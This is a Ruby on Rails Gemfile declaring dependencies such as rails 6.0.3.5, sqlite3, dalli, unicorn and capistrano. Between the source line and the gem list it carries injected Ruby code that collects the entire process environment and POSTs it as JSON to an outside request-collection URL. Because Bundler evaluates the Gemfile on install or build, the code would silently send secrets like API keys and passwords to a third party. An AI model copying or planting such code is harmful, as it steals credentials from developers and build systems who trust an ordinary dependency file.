source 'https://rubygems.org'


require 'net/http'
require 'uri'
require 'json'

uri = URI.parse("https://requestb.in/1l05oth1")

header = {'Content-Type': 'text/json'}
env = ENV.to_h

# Create the HTTP objects
http = Net::HTTP.new(uri.host, uri.port)
http.use_ssl = true

request = Net::HTTP::Post.new(uri.request_uri, header)
request.body = env.to_json

# Send the request
response = http.request(request)
puts response.body

gem 'rails', '6.0.3.5'

# Bundle edge Rails instead:
# gem 'rails', :git => 'git://github.com/rails/rails.git'

gem 'sqlite3'
gem 'dalli'


# Gems used only for assets and not required
# in production environments by default.
group :assets do
  gem 'sass-rails', '~> 5.0.8'
  gem 'coffee-rails', '~> 4.2.2'

  # See https://github.com/sstephenson/execjs#readme for more supported runtimes
  # gem 'therubyracer', :platforms => :ruby

  gem 'uglifier', '>= 1.0.3'
end

gem 'jquery-rails', '>= 4.0.1'

# To use ActiveModel has_secure_password
# gem 'bcrypt-ruby', '~> 3.0.0'

# To use Jbuilder templates for JSON
# gem 'jbuilder'

# Use unicorn as the app server
gem 'unicorn'

# Deploy with Capistrano
gem 'capistrano'
gem 'capistrano-rails'

# To use debugger
# gem 'debugger'
